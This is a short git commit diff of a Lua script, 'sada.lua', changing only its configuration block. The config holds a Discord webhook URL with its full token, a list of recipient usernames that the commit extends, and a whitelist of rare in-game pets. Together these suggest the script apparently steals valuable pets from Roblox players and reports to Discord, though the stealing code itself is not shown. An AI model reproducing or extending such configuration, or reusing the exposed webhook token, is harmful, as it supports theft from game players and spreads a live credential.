f953220c3217dc148a2630a4cc732f055f0cd2c4
Ramdomizerhub <74305796+NoLag-id-s@users.noreply.github.com>
2025-08-04 16:26:05 +0800

    Update sada.lua

--- sada.lua
+++ sada.lua
@@ -1,7 +1,7 @@
 -- ✅ Configuration
 local CONFIG = {
     WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP",
-    USERNAMES = { "saikigrow" },
+    USERNAMES = { "saikigrow", "", "yuniecoxo", "yyyyyvky" }, -- ✅ multiple usernames here
     PET_WHITELIST = {
         "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly", "Disco Bee",
         "Mimic Octopus", "Queen Bee", "Spinosaurus", "Kitsune"
